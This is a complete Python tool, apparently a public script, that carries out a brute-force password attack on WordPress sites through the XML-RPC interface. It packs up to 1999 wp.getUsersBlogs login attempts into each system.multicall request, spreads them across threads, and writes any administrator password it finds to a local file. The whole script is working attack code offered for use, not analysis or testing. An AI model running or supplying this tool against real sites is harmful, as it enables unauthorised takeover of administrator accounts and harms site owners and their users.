#!/usr/bin/env python3

import datetime as dt
import argparse
from colorama import Fore, Back, Style
from itertools import islice
from queue import Queue
import re
import signal
import sys
from tqdm import tqdm
import threading
import time
import xmlrpc.client

# Stop threads_number when set to True
exit_flag = False

DEBUG = Fore.BLUE + "[DEBUG] "
INFO = Fore.GREEN + "[INFO] "
ERROR = Fore.RED + "[ERROR] "
RESULT = Style.BRIGHT + Fore.CYAN + "[RESULT] "
TRAFFIC_IN = Back.MAGENTA + "[TRAFFIC IN] "
TRAFFIC_OUT = Fore.MAGENTA + "[TRAFFIC OUT] "
WARNING = Fore.YELLOW + "[WARNING] "


class Thread(threading.Thread):
    def __init__(self, queue, xmlrpc_intf, username, verbose):
        threading.Thread.__init__(self)
        self.queue = queue
        self.xmlrpc_intf = xmlrpc_intf
        self.username = username
        self.verbose = verbose

    def run(self):
        proxy = xmlrpc.client.ServerProxy(self.xmlrpc_intf)
        self.caller(proxy)

    def caller(self, proxy):
        """ Populate the XML-RPC system.multicall() with the maximum number of predefined
            of subrequests and then fire it. 
        """

        calls = 0
        global exit_flag

        pbar = tqdm(self.queue.qsize(), desc=self.name, total=self.queue.qsize(
        ), unit='multicall', unit_scale=True, dynamic_ncols=True)

        while not self.queue.empty() and not exit_flag:
            chunks_size = self.queue.get()
            multicall = xmlrpc.client.MultiCall(proxy)

            for passwords in chunks_size:
                # Can be any other available method that needs auth.
                multicall.wp.getUsersBlogs(self.username, passwords.strip())

            try:
                if self.verbose:
                    pbar.write(Fore.MAGENTA + "[{}]".format(self.name) +
                               TRAFFIC_OUT + "XML request [#{}]:".format(calls))
                    pbar.write("{}".format(chunks_size) + Style.RESET_ALL)

                res = multicall()
            except:
                pbar.write(
                    ERROR + "Could not make an XML-RPC call" + Style.RESET_ALL)
                continue

            if self.verbose:
                pbar.write(Back.MAGENTA + "[{}]".format(self.name) +
                           TRAFFIC_IN + "XML response [#{}] (200 OK):".format(calls))
                pbar.write("{}".format(res.results) + Style.RESET_ALL)

            if re.search("isAdmin", str(res.results), re.MULTILINE):
                i = 0

                for item in res.results:
                    if re.search(r"'isAdmin': True", str(item)):
                        exit_flag = True
                        # let time for the threads to terminate
                        time.sleep(2)
                        # pbar.write() seems to be bugged at the moment
                        pbar.write(RESULT + "Found a match: {0}:{1}".format(
                            self.username, str(chunks_size[i].strip()).replace('b', '').replace("'", "") + Style.RESET_ALL))
                        # Log the password in case sys.stdout acts dodgy
                        with open("passpot.pot", "a+") as logfile:
                            logfile.write(
                                "{0} - {1}:{2}\n".format(self.xmlrpc_intf, self.username, str(chunks_size[i].strip()).replace('b', '').replace("'", "")))
                        break

                    i += 1

            calls += 1
            self.queue.task_done()
            pbar.update()

        pbar.close()


def banner():

    banner = Style.DIM + """  
__  ___ __ ___ | |_ __ _ __   ___      
\ \/ / '_ ` _ \| | '__| '_ \ / __|____ 
 >  <| | | | | | | |  | |_) | (_|_____|
/_/\_\_| |_| |_|_|_|  | .__/ \___|     
                      |_|              
 _                _        __                         
| |__  _ __ _   _| |_ ___ / _| ___  _ __ ___ ___ _ __ 
| '_ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '__|
| |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |   
|_.__/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|   \n""" + Style.RESET_ALL
    print("{}".format(banner))


def parse_args():
    """ Parse and validate the command line
    """

    parser = argparse.ArgumentParser(
        description="XML-RPC Brute Force Amplification Attack")

    # Empiric tests has shown that 1999 is the maximum number of calls
    parser.add_argument("-c", "--chunk", dest="chunks_size",
                        help="number of calls to encapsulate within a system.mullticall() call, set this to 1 for WP > V4.7", default=1999, type=int)
    parser.add_argument("-t", "--thread", dest="threads_number",
                        help="number of threads to run, 20 are enough", default=5, type=int)
    parser.add_argument("-u", "--username", dest="username",
                        help="username of the targeted user,", required=True)
    parser.add_argument("-v", "--verbose", dest="verbose",
                        help="print debugging information", action='store_true')
    parser.add_argument("-w", "--wordlist", dest="wordlist",
                        help="wordlist containing the passwords", required=True, type=argparse.FileType('rb'))
    parser.add_argument("-x", "--xml-rpc", dest="xmlrpc_intf",
                        help="xmlrpc interface to attack, for example: -x http://example.com/xmlrpc.php", required=True)

    return parser.parse_args()


def reader(wordlist, chunks_size, verbose):
    """ Load up chunks_sizes of the wordlist
        into the queue 
    """

    queue = Queue()
    chunk = list(islice(wordlist, chunks_size))

    while chunk:
        # Get chunks_size records from the wordlist
        if verbose:
            print(Fore.BLUE + "[QUEUE]" + DEBUG + "inserting into queue:")
            print("{}".format(chunk) + Style.RESET_ALL)

        queue.put(chunk)
        chunk = list(islice(wordlist, chunks_size))

    return queue


def signal_handler(signum, *kwargs):
    """ A handler for various interrupts 
    """

    global exit_flag
    exit_flag = True

    if signum == signal.SIGINT:
        print(ERROR + "User quit" + Style.RESET_ALL)
    else:
        print(ERROR + "Signal caught: {}".format(signum) + Style.RESET_ALL)

    print("[*] Shutting down at {}".format(time.ctime()))
    # let time for the threads to terminate
    time.sleep(2)
    sys.exit(0)


def round_seconds(obj: dt.datetime) -> dt.datetime:
    if obj.microseconds >= 500_000:
        obj += dt.timedelta(seconds=1, microseconds=0)
    obj.isoformat(sep=" ", timespec="seconds")
    return obj


def main():
    # Register interrupts for CTRL+C/Break
    signal.signal(signal.SIGINT, signal_handler)

    banner()

    args = parse_args()

    chunks_size = args.chunks_size
    threads_number = args.threads_number
    username = args.username
    verbose = args.verbose
    wordlist = args.wordlist
    xmlrpc_intf = args.xmlrpc_intf

    print("[*] Starting at {}".format(time.ctime()))
    st = dt.datetime.now().replace(microsecond=0)
    threads = []

    # Load and segmentate the wordlist into the queue
    queue = reader(wordlist, chunks_size, verbose)

    # Run a few threads on the network requester
    for i in range(threads_number):
        thread = Thread(queue, xmlrpc_intf, username, verbose)
        thread.daemon = True
        thread.start()
        threads.append(thread)
        # Wait tqdm to get the previous pbar position to compute the position for the current thread pbar
        time.sleep(0.5)

    # Block the main thread until the daemons have processed everything that's in the queue
    for thread in threads:
        thread.join()

    if not exit_flag:
        print(WARNING + "No match found" + Style.RESET_ALL)
    else:
        print(INFO + "Password logged" + Style.RESET_ALL)

    print(f"[*] Finished at {time.ctime()}")
    ft = dt.datetime.now().replace(microsecond=0) - st
    print(INFO + f"[*] Tooks {ft}" + Style.RESET_ALL)


if __name__ == "__main__":
    main()
